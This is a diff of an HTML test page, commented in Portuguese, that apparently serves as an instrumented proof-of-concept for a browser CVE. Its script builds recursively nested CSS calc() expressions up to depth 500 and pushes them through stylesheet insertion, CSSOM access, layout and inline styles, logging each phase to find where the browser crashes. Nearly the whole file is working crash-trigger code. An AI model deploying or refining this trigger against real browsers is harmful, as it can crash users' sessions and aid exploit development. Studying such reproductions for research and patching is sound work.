@@ -2,113 +2,138 @@
 <html lang="pt-BR">
 <head>
 <meta charset="UTF-8">
-<title>V1 Phase Mapping</title>
+<title>V1 Instrumented</title>
 <style>
-body{font-family:monospace;font-size:14px}
+body{background:#0a0a0a;color:#88ff88;font-family:monospace;padding:16px}
+#log{background:#111;border:1px solid #88ff88;padding:12px;height:320px;overflow-y:auto;font-size:12px}
+.phase{color:#ffbb00}
+.ok{color:#00ff88}
+.err{color:#ff4444}
 </style>
 </head>
 <body>
 
-<h3>CVE-2025-43535 — Variante 1 (Mapeamento de Fases)</h3>
-<pre id="log"></pre>
+<h3>CVE-2025-43535 — Variante 1 Instrumentada (Original)</h3>
+<div id="log"></div>
 
 <script>
+"use strict";
+
 const logEl = document.getElementById("log");
 
-function L(msg){
-    const t = performance.now().toFixed(2);
-    const line = `[${t}] ${msg}`;
-    console.log(line);
-    logEl.textContent += line + "\n";
+function L(msg, cls){
+  const t = performance.now().toFixed(2);
+  const line = `[${t}] ${msg}`;
+  const div = document.createElement("div");
+  div.textContent = line;
+  div.className = cls || "";
+  logEl.appendChild(div);
+  logEl.scrollTop = logEl.scrollHeight;
+  console.log(line);
 }
 
 function setPhase(name){
-    document.title = name;
-    L("===== " + name + " =====");
+  document.title = name;
+  L("===== " + name + " =====","phase");
 }
 
 function wait(ms){
-    return new Promise(r=>setTimeout(r,ms));
+  return new Promise(r=>setTimeout(r,ms));
 }
 
-/* ================================
-   V1 EXPONENCIAL DIRETA ORIGINAL
-   ================================ */
-function buildExponential(depth){
-    let s = "1px";
-    for(let i=0;i<depth;i++){
-        s = "calc(" + s + " + " + s + ")";
-    }
-    return s;
+/* ===========================
+   MAKEDEEPCALC ORIGINAL
+   =========================== */
+function makeDeepcalc(depth, unit){
+  if(depth <= 0) return `10${unit}`;
+  return `calc(${makeDeepcalc(depth-1, unit)} + ${depth}${unit})`;
 }
 
-/* ================================
-   TESTE DE UM DEPTH
-   ================================ */
+/* ===========================
+   TESTE DE UMA PROFUNDIDADE
+   =========================== */
 async function testDepth(depth){
 
-    L("════════════════════════════════════");
-    L("TESTANDO DEPTH = " + depth);
+  L("════════════════════════════════════");
+  L("TESTANDO DEPTH = " + depth);
 
-    /* PHASE 1 — BUILD */
-    setPhase("PHASE 1 BUILD");
-    let expr = buildExponential(depth);
-    L("Construção OK — length = " + expr.length);
+  const el = document.createElement("div");
+  el.style.cssText = "position:absolute;top:-9999px";
+  document.body.appendChild(el);
 
-    await wait(100);
+  const sheet = document.createElement("style");
+  document.head.appendChild(sheet);
 
-    /* PHASE 2 — INSERT STYLE */
-    setPhase("PHASE 2 INSERT");
-    let style = document.createElement("style");
-    document.head.appendChild(style);
+  /* PHASE 1 — BUILD STRING */
+  setPhase("PHASE 1 BUILD");
+  let calcStr = makeDeepcalc(depth,"px");
+  L("String construída — length=" + calcStr.length,"ok");
+  await wait(100);
 
-    style.textContent = ".t{width:" + expr + "}";
-    L("Inserção OK");
+  /* PHASE 2 — INSERT STYLESHEET */
+  setPhase("PHASE 2 INSERT STYLE");
+  sheet.textContent = `div.test { width:${calcStr}; height:${calcStr}; }`;
+  L("Stylesheet inserido","ok");
+  await wait(100);
 
-    await wait(100);
+  /* PHASE 3 — ACCESS CSSOM */
+  setPhase("PHASE 3 CSSOM ACCESS");
+  try{
+    let rules = sheet.sheet?.cssRules;
+    L("cssRules length=" + (rules?rules.length:"null"),"ok");
+  }catch(e){
+    L("Erro cssRules: "+e,"err");
+  }
+  await wait(100);
 
-    /* PHASE 3 — YIELD */
-    setPhase("PHASE 3 YIELD");
-    await wait(100);
+  /* PHASE 4 — LAYOUT */
+  setPhase("PHASE 4 LAYOUT");
+  el.className="test";
+  void el.offsetWidth;
+  L("Layout OK","ok");
+  await wait(100);
 
-    /* PHASE 4 — LAYOUT */
-    setPhase("PHASE 4 LAYOUT");
-    let d = document.createElement("div");
-    d.className = "t";
-    document.body.appendChild(d);
-    void d.offsetWidth;
-    L("Layout OK");
+  /* PHASE 5 — INLINE STYLE PATH */
+  setPhase("PHASE 5 INLINE STYLE");
+  el.style.width = calcStr;
+  el.style.height = calcStr;
+  L("Inline style aplicado","ok");
+  await wait(100);
 
-    await wait(100);
+  /* PHASE 6 — RE-LAYOUT */
+  setPhase("PHASE 6 RE-LAYOUT");
+  void el.offsetWidth;
+  let cs = getComputedStyle(el).width;
+  L("Computed width="+cs,"ok");
+  await wait(100);
 
-    /* PHASE 5 — COMPUTED STYLE */
-    setPhase("PHASE 5 COMPUTED");
-    let cs = getComputedStyle(d).width;
-    L("ComputedStyle OK: " + cs);
+  document.head.removeChild(sheet);
+  document.body.removeChild(el);
 
-    await wait(100);
-
-    setPhase("DEPTH COMPLETO " + depth);
-    L("DEPTH " + depth + " COMPLETO SEM CRASH");
+  setPhase("DEPTH COMPLETO "+depth);
+  L("DEPTH "+depth+" COMPLETO","ok");
 }
 
-/* ================================
-   EXECUÇÃO SEQUENCIAL
-   ================================ */
+/* ===========================
+   EXECUÇÃO
+   =========================== */
 (async function(){
 
-    L("=== INÍCIO TESTE V1 ===");
+  L("=== INÍCIO V1 INSTRUMENTADA ===");
 
-    for(let depth=24; depth<=27; depth++){
-        try{
-            await testDepth(depth);
-        }catch(e){
-            L("ERRO CAPTURADO: " + e);
-        }
-        await wait(500);
+  /* Ajuste aqui se quiser testar mais profundo */
+  const depths = [50,100,150,200,300,400,500];
+
+  for(const d of depths){
+    try{
+      await testDepth(d);
+    }catch(e){
+      L("ERRO CAPTURADO: "+e,"err");
     }
+    await wait(500);
+  }
 
-    L("=== FIM DOS TESTES ===");
+  L("=== FIM DOS TESTES ===","ok");
 
 })();
 </script>
